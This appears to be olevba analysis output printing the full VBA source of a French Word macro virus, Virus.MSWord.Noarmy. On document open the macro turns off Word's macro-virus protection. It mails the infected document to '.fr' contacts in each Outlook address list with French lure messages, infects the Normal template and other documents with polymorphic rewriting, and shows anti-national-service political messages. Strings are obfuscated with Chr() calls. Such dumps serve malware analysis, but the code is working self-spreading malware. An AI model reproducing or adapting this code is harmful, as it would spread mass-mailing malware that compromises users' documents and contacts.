olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Noarmy-caa42a4c1490036771d25a64ba5bcf529f9908cc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NOSN.cls 
in file: Virus.MSWord.Noarmy-caa42a4c1490036771d25a64ba5bcf529f9908cc - OLE stream: 'Macros/VBA/NOSN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim h7, g8, j1, k2, j8, l1, m5, l8, a5, _
d3, g6, h3, k1, k5, g3, n6, h5, j5, k7 ' pwadptz
Dim e8, b9, a7, d6, c5, e2, g1, l3, l9, _
n2, m1, h8, l5, i1, i7, e4, c7, c4, _
f3, h1, d8: Dim g5, e1, _
m4, b3, d4, f7, i3, g2, e5, d2, a4, a3, a2, c2, d1, c3, c1, b2, b1, a1 ' whtz
Private Sub Document_Open() ' sahmdtlfidspx
On Error Resume Next ' okfysc
Call f1 ' giwgacwwl
Call f2 ' jxckqrohmsr
Randomize: Select Case System.PrivateProfileString(j1, k2, j8): Case Is <> j1 ' ynghljeql
System.PrivateProfileString(j1, k2, j8) = 1& ' eaoemzihd
Case Else ' rhlicoeyme
Options.ConfirmConversions = m5: Options.VirusProtection = m5: Options.SaveNormalPrompt = m5: End Select: d8 = a5: Set c4 = CreateObject(d8): Set f3 = c4.GetNameSpace(l8) ' ljabndjqhqsezvr
Select Case System.PrivateProfileString(j1, d3, g6) ' afpybiqrmez
Case Is <> h3 ' einhppyj
Select Case c4 ' mzifled
Case k1 ' labtmeyedtyin
f3.Logon k5, g3 ' xedeqbkqwauw
For i = 1 To f3.AddressLists.Count ' pllasr
Set g4 = f3.AddressLists(i): Set h1 = c4.CreateItem(m5): h2 = g4.AddressEntries.Count: b6 = m5: For j = 1 To h2 ' umqgcvdhq
Set j2 = g4.AddressEntries(j): Select Case Len(j2.Address): Case Is > 4 ' khnurxt
Select Case InStr(Len(j2.Address) - 3, j2.Address, n6, vbTextCompare) ' smsvrj
Case Is <> 0 ' zhtm
h1.Recipients.Add j2 ' twdnzfgrddn
b6 = b6 + 1 ' tgtlbaotiwfq
End Select ' utkweqvlfluneh
End Select: Select Case b6: Case 50 ' gneqe
Exit For: End Select: Next j ' snswbjcj
Select Case Rnd(): Case Is < 0.33: h1.Subject = h5 ' urwivzaczflv
h1.Body = j5: Case Is < 0.66 ' rauyndws
h1.Subject = g1: h1.Body = l3: Case Else: h1.Subject = l9: h1.Body = n2 ' edrh
End Select ' ypfxujeiv
h1.Attachments.Add ActiveDocument.FullName ' ikgyanbsk
h1.Send: Next i: f3.Logoff: End Select ' yfmgaxcrh
System.PrivateProfileString(j1, d3, _
g6) = h3: End Select: Set n1 = ActiveDocument.VBProject ' jocuuvekxxu
Set i6 = n1.VBComponents.Item(1): Set n1 = NormalTemplate.VBProject: Set k3 = n1.VBComponents.Item(1): i2 = False: Select _
Case InStr(1, ActiveDocument.Name, m1) ' ycndbzkwzhrvcca
Case False: Select Case i6.Name ' cbwenaovjcn
Case Is <> g6 ' yffscmkoo
Set b5 = k3: Set f5 = i6: i2 = True: End Select: End Select: Select Case k3.Name ' acqijd
Case Is <> g6: Set b5 = i6: Set f5 = k3 ' cjmjani
i2 = True: End Select ' uxycnqdm
Select Case i2 ' lwdasqbnroeg
Case True ' jflltrjdtvrievc
i4 = b5.CodeModule.CountOfLines - 1: c8 = f5.CodeModule.CountOfLines: Select Case c8 ' qjzeadctxcvdigb
Case Is > 0: f5.CodeModule.DeleteLines 1, c8: End Select: c6 _
= 1: c9 = "": j3 = "" ' ykjifsnebedirf
a6 = 0: For l2 = 1 To i4 ' mndmfhiquzjl
h4 = b5.CodeModule.Lines(l2, 1): i = 1 ' qgvuzqwrtkl
f4 = InStr(1, h4, Chr(39)) ' wqmqojdjnloow
Select Case f4 ' jlgdhmflfli
Case 0 ' eshzayxuzdcawx
f4 = Len(h4): Case Else: f4 = f4 - 2: End Select: Do ' jjudrqrwm
j = InStr(i, h4, Chr(32)): Select Case j: Case 0 ' rcvbypsqszawbf
j = Len(h4) + 1 ' aydzaxml
b8 = True ' mmirth
Case f4 + 1 ' fzmodqoqebaid
b8 = True ' csyffo
Case Else: b8 = _
False: End Select: n5 = Mid(h4, i, j - i): Select Case b8: Case True: f6 = b5.CodeModule.Lines(l2 + 1, 1) ' hzrrjman
k4 = InStr(1, f6, Chr(32)): Select Case k4 ' zwttf
Case 0 ' dnwrffgleqh
j3 = "": Case Else: j3 = Mid(f6, 1, k4 - 1) ' ygfotrpmy
End Select ' zxzvwhrjtj
End Select: Select Case n5: Case k7 + _
Chr(58): n5 = e8 + Chr(58) ' nugugyfcjvxx
Case e8 + Chr(58) ' ocablnqw
n5 = k7 + Chr(58) ' gmjvhvjbamtczy
Case k7 ' ubbzwslvnjzybo
n5 = e8: Case e8: n5 = k7 ' gdbdvyijlmsrjl
End Select: Select Case h6: Case False: Select _
Case Rnd() ' kqfzswcn
Case Is < 0.02: h6 = True: Case Else: h6 _
= False ' gligbj
Select Case b8: Case True ' lava
Select Case l2: Case _
i4: h6 = _
True: End Select ' ksvqjll
Select Case Rnd(): Case Is < 0.5: h6 = True: End Select: Select Case j3 ' pcytw
Case e4 ' gtrxbaceu
h6 = True: a6 = a6 + 1: Select Case a6: Case 4: l2 = i4 ' dtqoh
End Select: End Select: Select Case InStr(1, h4, c7) ' kipvlnj
Case Is <> 0 ' fqiniobymcsohz
Select Case n5 ' umspfvvzdxhv
Case j17: h6 = False: Case Else: h6 = True ' iarmkkxaifzra
End Select: End Select ' cwsvahnkehjrd
End Select ' mucmngcdmpplvg
End Select: Select Case Len(n5) ' ukuzwjmj
Case Is <> 0: Select Case InStr(Len(n5), n5, Chr(58)) ' kcom
Case Is <> 0: Select Case Rnd(): Case Is < 0.5 ' dfcrvngyxab
h6 = True: End Select ' leulhteipxmjx
End Select ' zrzpjvvnkin
End Select ' vgwojkhxvuvpm
Case Else ' qnqmzndxjpjw
h6 = False ' yozhe
End Select ' uryt
Select Case b8: Case True: Select Case n5: Case Chr(95): c9 _
= c9 + Switch(h6 = _
True, Chr(95), h6 = False, j1) ' tkurkxbttdwcr
j4 = False ' rnslaafkexrxfko
Case Else ' ppetdgxxddsgbxi
c9 = c9 + Switch(h6 = True, n5, h6 = False, n5 + Chr(58) + Chr(32)) ' miazdcwnqnykb
j4 = True ' fxvgymcv
End Select ' xgkhwrj
Case Else: Select Case InStr(Len(n5), n5, Chr(58)) ' okppdmbntrqmzb
Case 0 ' jucmqbfrxcsog
c9 = c9 + Switch(h6 = True, n5 + Chr(32) + Chr(95), _
h6 = False, n5 + Chr(32)) ' wbzgatnzdwh
j4 = False: Case Else: c9 = c9 + Switch(h6 = True, Mid(n5, 1, Len(n5) - 1), h6 = False, n5 + Chr(32)): j4 = True: End Select ' hqotkgdeaa
End _
Select: Select Case h6 ' wuleon
Case True ' ecps
Select Case j4 ' lyhgbooqtjua
Case True: c9 = c9 + Chr(32) + Chr(39) + Chr(32) ' tmkwvghzmjaygga
e6 = Int((12 * Rnd) + 4): For d5 = 1 To e6 ' fvmk
c9 = c9 + Chr$(Int((26 * Rnd) + 97)): Next d5 ' uuugagciebifb
End Select: f5.CodeModule.InsertLines c6, c9 ' pyufnuoz
c6 = c6 + 1 ' tkoqcvbeu
c9 = "": End Select ' yqkpoqj
i = j + 1 ' jnewicexglwsm
Select Case b8 ' uyxesbe
Case True ' ijglqgksuapeqcv
Exit Do: End Select: Loop ' umzjquygaaknfkq
Next l2: Select Case k3.Name: Case Is <> g6: f5.Name = g6: NormalTemplate.Save ' kdinpybdvlf
End Select ' ghuuaonfcltffba
Select Case i6.Name ' pncsejc
Case Is <> g6 ' vzxdztnz
f5.Name = g6 ' bfjh
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: ActiveDocument.Saved = True: End Select ' rjkkyxtwmy
Case Else ' blbt
Select Case InStr(1, ActiveDocument.Name, m1): Case False: Select Case Rnd() ' pzqkmtqzggt
Case Is < _
0.015: MsgBox h8 + l5 + i1 + i7, 32: MsgBox g5 + e1 + m4 + b3 + d4 + f7, 16 ' woonzzylzygcz
MsgBox i3 + g2 + e5 + d2 + _
a4, 16 ' wivjukce
MsgBox a3 + a2 + c2 + d1 + c3, 16 ' avugwdkehvxern
MsgBox c1 + b2, 16: MsgBox b1 + a1, 48 ' ebcwlsxpcmlpqpo
Case Is < 0.03 ' siyyqaqs
Selection.TypeText b9: Case Is < 0.045: Selection.TypeText a7 ' ckcfqlomavvsqlv
Case Is < 0.06 ' faal
Selection.TypeText d6: Case Is < 0.075: Selection.TypeText c5: Case Is < _
0.09: Selection.TypeText e2: End Select ' lwkwhwdaej
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName ' hvjkjq
ActiveDocument.Saved = True ' xpzw
End Select ' tjauqkdfoj
End Select ' mimhxzzxfzt
End Sub ' povrpvsgaehcj
Private Sub f1() ' dqprbscflpnwy
h7 = Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111) ' lnmk
g8 = Chr(83) + Chr(101) _
+ Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + _
Chr(46) + Chr(46) + Chr(46): j1 = "": k2 = Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + _
Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) ' tcrdvftfwkk
k2 = k2 + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) ' pdetpecsoddgj
k2 = k2 + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) ' vdpwbmrlzdz
k2 = k2 + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) ' jutrfsbbnnkqao
k2 = k2 + Chr(99) + Chr(101) + Chr(92) + Chr(57) + Chr(46) + Chr(48) + Chr(92) + Chr(87) + Chr(111) + Chr(114) ' fqoyprdl
k2 = k2 + Chr(100) + Chr(92) + Chr(83) + Chr(101) + Chr(99) _
+ Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) ' xgveykbn
j8 = Chr(76) + Chr(101) + Chr(118) + Chr(101) + Chr(108) ' zvbruud
l1 = Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115) ' munuipj
m5 = 0: l8 = Chr(77) + Chr(65) + Chr(80) + Chr(73) ' balc
a5 = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112) ' havnsxxeziyizlw
a5 = a5 + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + _
Chr(111) + Chr(110) ' ujfehrkn
d3 = Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) ' migeuo
d3 = d3 + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102): d3 = d3 + Chr(116) + Chr(119) + Chr(97) + _
Chr(114) + _
Chr(101) + Chr(92) + Chr(77) _
+ Chr(105) + Chr(99) + Chr(114): d3 = d3 + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) ' jehjazzeibxjbe
d3 = d3 + Chr(99) + Chr(101) + Chr(92) ' rafupgvhlxnndbp
g6 = Chr(78) + Chr(79) + Chr(83) + Chr(78): h3 = "Non" + Chr(32) + "au" + Chr(32) + "Service" + Chr(32) + "National" + Chr(32) + "-" + Chr(32) + "Oui" + Chr(32): h3 = h3 + "au" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail": k1 = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107): k5 = Chr(112) + Chr(114) + Chr(111) + Chr(102) + Chr(105) + Chr(108) + Chr(101): g3 = Chr(112) + Chr(97) + Chr(115) + Chr(115) + Chr(119) + Chr(111) + Chr(114) + Chr(100) ' gkwgoq
n6 = Chr(46) + Chr(102) + Chr(114) ' ihafyrqllsx
h5 = "Suggestion..." ' csvkam
j5 = "Ce" + Chr(32) + "document" + Chr(32) + "(" _
+ ActiveDocument.Name + ")" + Chr(32) + "vaut" + Chr(32) + "bien" ' fjbbwccswpiy
j5 = j5 + Chr(32) + "un" + _
Chr(32) + "petit" + Chr(32) + "coup" + Chr(32) + "d" + Chr(39) + "oeil." _
+ Chr(13) + "J" + Chr(39) + "aimerais": j5 = j5 + Chr(32) + "savoir" + Chr(32) + "s" + Chr(39) + "il" + Chr(32) + "correspond" + Chr(32) + "à" + Chr(32) + "ce" + Chr(32) ' cknxjgjhuoyhr
j5 = j5 + "qu" + Chr(39) + "on" + Chr(32) + "attends" + Chr(32) + "de" + Chr(32) + "lui." + Chr(13) ' afjrqiewkkc
k7 = Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + _
Chr(116) + Chr(95): k7 = _
k7 + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41): e8 = Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + _
Chr(110) + Chr(116): e8 = e8 + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41): b9 = Chr(32) + "http://sn.agat.net" + Chr(32): a7 = Chr(32) + "http://altern.org/gigm/service.htm" + Chr(32) ' mzuuj
d6 = _
Chr(32) + "http://www.donquichotte.com" + Chr(32): c5 = Chr(32) + _
"http://www.multimania.com/antisn" + Chr(32): e2 = Chr(32) + "Oui" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "Emploi," + Chr(32) + "Oui" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "armée" + Chr(32): e2 = e2 + "de" + Chr(32) + "métier," + Chr(32) + "mais" + Chr(32) + _
"Non" + Chr(32) + "au" + Chr(32) + "service": e2 = e2 + Chr(32) + "national" + Chr(32) + "sous" + Chr(32) + "contrat" + Chr(32) + "de" + Chr(32) + "travail," + Chr(32) ' zqrwxwvwuc
e2 = e2 + "Non" _
+ Chr(32) + "à" + Chr(32) + _
"l" + Chr(39) + "absurdité." + Chr(32): g1 = "Un" + Chr(32) + "peu" + Chr(32) + "d" + Chr(39) + "aide..." ' kdmanpqdplhavf
l3 = "Je" + Chr(32) + "dois" + Chr(32) + "avouer" + Chr(32) + "que" + Chr(32) + "j" + Chr(39) + "ai" + _
Chr(32) + "un" + Chr(32) + _
"peu": l3 = l3 + Chr(32) + "de" + Chr(32) + "mal" + Chr(32) + "à" + Chr(32) + "peaufiner" + Chr(32) + "ce" + Chr(32) + "document" ' vekbmx
l3 = l3 + Chr(32) + "(" + ActiveDocument.Name _
+ ")." + Chr(13) + "Merci" + Chr(32) + "de" + Chr(32) + "m" + Chr(39) + "aider" + Chr(32): l3 = l3 + "un" + Chr(32) + "peu" + Chr(32) + "pour" + Chr(32) + "l" + Chr(39) + "améliorer..." + Chr(13): l9 = "Version" + Chr(32) + "finale": n2 = "Voici" + Chr(32) + "la" + Chr(32) + "dernière" + _
Chr(32) + _
"version" + Chr(32) + "de" _
+ Chr(32) + "ce" + Chr(32) ' eazekh
n2 = n2 + "sur" + Chr(32) + "quoi" + Chr(32) + "j" + Chr(39) + "ai" + Chr(32) _
+ "travaillé" + Chr(32) + "ces" + Chr(32) + "derniers" ' ncyhkppgwf
n2 = n2 + Chr(32) + "temps" + Chr(32) + "(" + ActiveDocument.Name + _
")." + Chr(13) + "Tous" + Chr(32) + "les" + Chr(32): n2 = n2 + "avis" + Chr(32) + "sont" + Chr(32) + "la" + Chr(32) + "bienvenue" _
+ Chr(32) + "!" + Chr(13): m1 = "Document": h8 = "Le" + Chr(32) + "mystère" + Chr(32) + "du" + Chr(32) + "jour" + Chr(32) + "à" + Chr(32) + "résoudre" + Chr(32) + "est" + Chr(32): h8 = h8 + "le" + Chr(32) _
+ "suivant:" + Chr(13) + Chr(13): End Sub ' vwukbllmwaven
Private Sub f2() ' wzaqppeedqgxj
l5 = "Lors" + Chr(32) + "de" + Chr(32) + "son" + Chr(32) + "intervention" + Chr(32) + "télévisée" + Chr(32) + "du" + Chr(32) + _
"22" + Chr(32) ' wbtatrkdnfn
l5 = l5 + "février" + Chr(32) + "1996," + Chr(32) + "Jacques" + Chr(32) _
+ "Chirac," + Chr(32) + "Président" + Chr(32) + "de" + Chr(32) + "la": l5 = l5 + Chr(32) + "République" + Chr(32) + "et" + Chr(32) + "Chef" + Chr(32) + "des" + Chr(32) + "Armées," + Chr(32) + "a" + Chr(32) + "proclamé:" + Chr(32): i1 = """Nous" + Chr(32) + "n" + Chr(39) + "avons" + Chr(32) + "plus" + Chr(32) + "besoin" + Chr(32) + "d" _
+ Chr(39) + "appelés..." _
+ Chr(32) + "(Le" + Chr(32) + "service" + Chr(32): i1 = i1 + "national)" + Chr(32) + "est" + _
Chr(32) + "devenu" + Chr(32) + "inégal" + Chr(32) + "et" + Chr(32) + "il" + Chr(32) + "n" + Chr(39) + "est" + Chr(32) + "plus" ' knskwllfqs
i1 = i1 + Chr(32) + "universel.""" + Chr(32) + "Le" + Chr(32) + "Service" + Chr(32) + "National" + Chr(32) + "a" + Chr(32) + "ensuite" + Chr(32) + "été": i1 = i1 + Chr(32) + "supprimé" + Chr(32) + "pour" + Chr(32) + "tous..." + Chr(32) + "ou" + Chr(32) + "presque:" + Chr(32): i7 = "Alors" + Chr(32) + "qu" + Chr(39) _
+ "il" + Chr(32) + "n" + Chr(39) + "est" + Chr(32) + "plus" + Chr(32) + "obligatoire" + Chr(32) + "pour" + Chr(32) + "les" + Chr(32) + "gens": i7 = i7 + Chr(32) + "nés" + Chr(32) + "après" + Chr(32) + "1979," + Chr(32) + "les" + Chr(32) + "gens" + Chr(32) + "nés" + Chr(32) + "avant" + Chr(32) ' rnjxkhimoglagma
i7 = i7 + "1979" + Chr(32) + "peuvent" + Chr(32) + "encore" + Chr(32) + "perdre" + Chr(32) + "emploi," + Chr(32) + "appartement," + Chr(32) + "vie" + Chr(32) ' kpllyjx
i7 = i7 + "de" + Chr(32) + "famille" + Chr(32) + "sur" + Chr(32) + "simple" + Chr(32) + "ordre" + Chr(32) + "du" + Chr(32) + "Service" + Chr(32) + "National.": g5 = "En" + Chr(32) + "réalité," + Chr(32) + "la" + Chr(32) + _
"situation" + Chr(32) + "actuelle" + Chr(32) + "est" + Chr(32) + _
"bien" + Chr(32) + _
"pire" + _
Chr(32): g5 = g5 + "encore:" + Chr(32) + _
"Après" + Chr(32) + "avoir" + Chr(32) + "accordé" + Chr(32) + "un" + Chr(32) + "report" + Chr(32) + "d" + Chr(39) + "incorporation" + Chr(32): g5 = g5 _
+ "de" + Chr(32) + "2" + Chr(32) + "ans" + Chr(32) + "aux" + Chr(32) ' jbayzslkioqhtht
e1 = "jeunes" + Chr(32) _
+ "ayant" + Chr(32) + "obtenu" + Chr(32) + "Contrat" + Chr(32) + "de" _
+ Chr(32) + "Travail," + Chr(32) + "l" + Chr(39) + "Armée" + Chr(32) + "a" + Chr(32): e1 = e1 + "l" + Chr(39) + "intention" + Chr(32) + "de" + Chr(32) + "les" + Chr(32) + "rappeler" + Chr(32) + "au" + Chr(32) + "beau" + Chr(32) + "milieu" + Chr(32) _
+ "de" + Chr(32) ' mcshl
e1 = e1 + "leur" + Chr(32) + "carrière" + Chr(32) + _
"professionnelle." + Chr(32) + "Les" + Chr(32) + "implications" + Chr(32) + "sont" + Chr(32) + "bien" + Chr(32): e1 = e1 + "sûr" + Chr(32) + "catastrophiques:" + Chr(13) + Chr(13) ' rpgn
m4 = Chr(32) + Chr(32) + "-" + Chr(32) + "Vivre" + Chr(32) + "sans" + Chr(32) + "salaire" + Chr(32) + "pendant" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "ne" ' yiavozuq
m4 = m4 + Chr(32) + "permet" + Chr(32) + "pas" + Chr(32) + "d" + Chr(39) + "assurer" + Chr(32) + "engagements," + Chr(32) + "dettes" + Chr(32) + "et" + Chr(32): b3 = "impôts" + Chr(32) + "qui" + Chr(32) + "sont" + Chr(32) + _
"déjà" + Chr(32) + "difficiles" + Chr(32) + "à" + Chr(32) + "assumer" + Chr(32) + "dans" + Chr(32) + "un": b3 = b3 + Chr(32) + "début" _
+ Chr(32) + "de" + Chr(32) + "vie" + Chr(32) + "active" + Chr(32) + "normal." + Chr(13) + Chr(13): d4 = Chr(32) + Chr(32) + "-" + Chr(32) + "Ne" + Chr(32) + "pas" + Chr(32) + "pratiquer" + Chr(32) + "son" + Chr(32) + "activité" + Chr(32) + "professionnelle" + Chr(32): d4 = d4 + "pendant" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "implique" + Chr(32) + "également" + Chr(32) + "une" + Chr(32) + "perte" + Chr(32) + "d" + Chr(39) + "expérience": d4 = d4 + Chr(32) + "utile," + Chr(32) + "la" + Chr(32) + "nécessité" + Chr(32) + "d" + Chr(39) _
+ "une" + Chr(32) + "période" + Chr(32) ' lexrjkdgahio
f7 = "de" + Chr(32) + "réadaptation," + Chr(32) + "une" + Chr(32) + "modification" + Chr(32) + "de" + Chr(32) + "son" + _
Chr(32) + "projet" + Chr(32) + "professionnel" ' vezvmngmqc
f7 _
= f7 + Chr(32) + "et" + Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "l" + Chr(39) + "inquantifiable" + Chr(32) + "colère" + Chr(32) + "des" + Chr(32) + "employeurs," + Chr(32) ' dhpdd
f7 = f7 + "qui" + Chr(32) + "se" + Chr(32) + _
"traduira," + Chr(32) _
+ "intentionnellement" + Chr(32) + "ou" + Chr(32) + "non," + Chr(32) + "par" + Chr(32) + "un" + Chr(32): f7 = f7 + "ralentissement" + Chr(32) + "dans" + Chr(32) _
+ "l" + Chr(39) + "évolution" + Chr(32) _
+ "de" + Chr(32) + "carrière." ' knaismumfkwtbe
i3 = Chr(32) + Chr(32) + "-" + Chr(32) + _
"Du" + Chr(32) _
+ "fait" + Chr(32) + _
"qu" + Chr(39) + "il" + Chr(32) + "soit" + Chr(32) + "tout" _
+ Chr(32) _
+ "bonnement" + Chr(32) + "impossible" ' nlnutwip
i3 = i3 + Chr(32) + "d" + Chr(39) + "assurer" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" _
+ _
Chr(32) + "loyer" + _
Chr(32) + "sans" + Chr(32) + "salaire" + _
Chr(32) + "sur" + Chr(32) ' qbbfqeylpofkirg
i3 = i3 + "cette" + Chr(32) + "période," + Chr(32): g2 = "l" + Chr(39) + "abandon" _
+ Chr(32) + "du" + Chr(32) + "logement" + Chr(32) + "est" + Chr(32) + "irrémédiable." + Chr(32) _
+ "Qui" + Chr(32) + "prendra" + Chr(32) + "alors" + Chr(32) ' yqnqftmxteqqjj
g2 = g2 + "en" + Chr(32) + "charge" + Chr(32) + "les" + Chr(32) + "frais" + Chr(32) + "de" + Chr(32) + "déménagement," + Chr(32) + "de" + Chr(32) + "garde-meuble" _
+ Chr(32) ' imumqym
g2 = g2 _
+ "et" + _
Chr(32) + "de" + Chr(32) + "recherche" + Chr(32) + "d" + Chr(39) + "un" + Chr(32) + "nouvel" + Chr(32) + "appartement?" + Chr(13) + Chr(13) ' rzwzuprcgjbyc
e5 = Chr(32) + Chr(32) + "-" + Chr(32) + "Et" + Chr(32) + "que" + _
Chr(32) + _
"dire" + Chr(32) + "de" _
+ Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "morale" + Chr(32) ' kjpp
e5 = e5 + "au" + Chr(32) + "plus" + Chr(32) + "bas" + Chr(32) + _
"durant" + Chr(32) + "ces" _
+ Chr(32) + "10" + Chr(32) + "longs" + Chr(32) + "mois" + Chr(32) _
+ "?" + Chr(32): e5 = e5 + "Le" + Chr(32) + "rêve" + Chr(32) + "de" + Chr(32) + "vie" + Chr(32) + "que" + Chr(32) + "l" + Chr(39) + "on" + Chr(32) + "était" + Chr(32) + "entrain" + Chr(32) + "de" + Chr(32) ' ihgerkotxcrzrof
e5 = e5 + "bâtir" + Chr(32) + "s" + Chr(39) + "effondre" + Chr(32) + "pour" + _
Chr(32) + "laisser" + Chr(32) + "place" ' vljej
d2 = Chr(32) + "aux" + Chr(32) + "corvées" + Chr(32) + "inutiles" + Chr(32) + "et" + Chr(32) + "a" + Chr(32) + "l" _
+ Chr(39) + "ennui" + Chr(32) + "bien" + Chr(32) + _
"connu" + Chr(32) + "du" ' fthvtre
d2 = d2 + Chr(32) _
+ "Service" + Chr(32) + "National." + Chr(32) + "Est-il" + _
Chr(32) + "possible" + Chr(32) + "de" + Chr(32) + "rester" + Chr(32) + _
"loin" + Chr(32) + "de" ' oevmeyzxp
a4 = a4 + Chr(32) + "la" + Chr(32) + "personne" + Chr(32) + "avec" + Chr(32) + "qui" + Chr(32) + "l" + Chr(39) + "on" + Chr(32) + "vie," + Chr(32) + "de" + Chr(32) + "ses" + Chr(32) + "relations," + _
Chr(32) + "de" ' tvifghgyzrsa
a4 = Chr(32) + "ses" + Chr(32) + "amis," + Chr(32) + "pendant" + Chr(32) + "10" + Chr(32) + "mois" _
+ Chr(32) + "puis" + Chr(32) + "de" + Chr(32) + "reprendre" + Chr(32) + "comme" _
+ Chr(32) + "si": a4 = _
a4 + Chr(32) + "rien" + Chr(32) _
+ "ne" + Chr(32) + "s" + Chr(39) + "était" + Chr(32) + "passé" _
+ Chr(32) + "?" ' hopwctnbhj
a3 = "Certains" + Chr(32) + "diront" + Chr(32) + "que" + Chr(32) + "le" + Chr(32) + "Service" + Chr(32) + "National" + Chr(32) + "fait" + Chr(32) + "partie" + Chr(32) + "du" + Chr(32) + "devoir" ' lwujtrjuh
a3 = _
a3 + Chr(32) + "de" + Chr(32) + "citoyen." + Chr(32) + "Mais" + Chr(32) + "servir" + Chr(32) + "son" + Chr(32) + "pays" + Chr(32) + "c" + Chr(39) + "est" + Chr(32) + "d" + Chr(39) + "abord" + Chr(32) + "payer" + Chr(32) ' kphyoxihj
a3 = a3 + "ses" + Chr(32) + "impôts," + Chr(32) + "participer" + Chr(32) + "aux" + Chr(32) + "frais" + Chr(32) + "de" + Chr(32) + "la" + Chr(32) + "sécurité" + Chr(32) + "sociale," _
+ Chr(32) + "des": a3 = a3 + _
Chr(32) + "allocations" + Chr(32) + "chômage," ' zkikdsolwdpuvme
a2 = Chr(32) + "des" + Chr(32) + "retraites," + Chr(32) + "etc." + Chr(32) + "Ce" + Chr(32) _
+ "sont" + Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "les" + _
Chr(32) + _
"personnes" + Chr(32) + "qui": a2 = a2 + Chr(32) + "travaillent" + Chr(32) + "qui" + Chr(32) + "payent" + Chr(32) + "tout" + Chr(32) _
+ "cela," + Chr(32) + "et" + Chr(32) _
+ "les" + Chr(32) + "actuels" + Chr(32) + "sursitaires" ' tzvgz
a2 = a2 + Chr(32) + "en" + Chr(32) _
+ "font" + Chr(32) + "partie." + Chr(32) + "Ils" + Chr(32) + "sont" + Chr(32) + "bien" + Chr(32) + "plus" + Chr(32) + "utiles" + Chr(32) ' kssapajlhlum
c2 = "à" _
+ Chr(32) + "la" + Chr(32) + "nation" + Chr(32) + "en" + Chr(32) + "tant" + Chr(32) + "que" + Chr(32) _
+ "cotisants" + Chr(32) + "qu" + Chr(39) + "en" + Chr(32) + "tant" + Chr(32) + "qu" + Chr(39) + "appelés" + Chr(32): c2 = c2 + "du" + Chr(32) + "contingent." + Chr(13) + Chr(13) ' whnppl
d1 = "Le" + Chr(32) + "service" + Chr(32) + "national" + Chr(32) + "prétends" + Chr(32) + "aujourd" + Chr(39) + "hui" + Chr(32) + "que" + Chr(32) + "la" + Chr(32) + _
"vie" + Chr(32) + "reprends" + Chr(32) + "son" ' qdfnujqhovdl
d1 = d1 + Chr(32) + "cour" + Chr(32) + "normalement" + Chr(32) + "après" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) + "service" + Chr(32) + "au" + Chr(32) + "milieu" + Chr(32) ' qbdjxi
d1 = d1 + "d" + Chr(39) + "un" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail." + Chr(32) + "C" + Chr(39) + "est" + Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "un" + Chr(32) + "véritable" + Chr(32) + "utopisme" ' vlyuvybrqdu
d1 = d1 + Chr(32) + "et" + Chr(32) + "le" _
+ Chr(32): c3 = "bilan" + Chr(32) + "ne" + Chr(32) + "se" + Chr(32) + "résume" + Chr(32) + "pas" + Chr(32) + _
"à" + Chr(32) + "une" + Chr(32) + "perte" + Chr(32) + "de" + Chr(32) + "10" _
+ Chr(32) + "mois" + Chr(32) ' yonexesb
c3 = c3 + "de" + Chr(32) + "temps:" + Chr(32) + "C" + Chr(39) + "est" + Chr(32) + "une" + Chr(32) + "véritable" + _
Chr(32) + "catastrophe" + Chr(32) + "pour" + Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "financière,": c3 = c3 + Chr(32) + "matérielle" + Chr(32) + "et" + Chr(32) + "morale" + Chr(32) + "de" + Chr(32) + "l" + Chr(39) + "individu," + Chr(32) + "qui" + Chr(32) + "aura" + Chr(32) + "des" + Chr(32) + "répercutions" + Chr(32) ' ifzzugpy
c3 = c3 + "regrettables" + Chr(32) + "et" + Chr(32) + "durables." ' kmitx
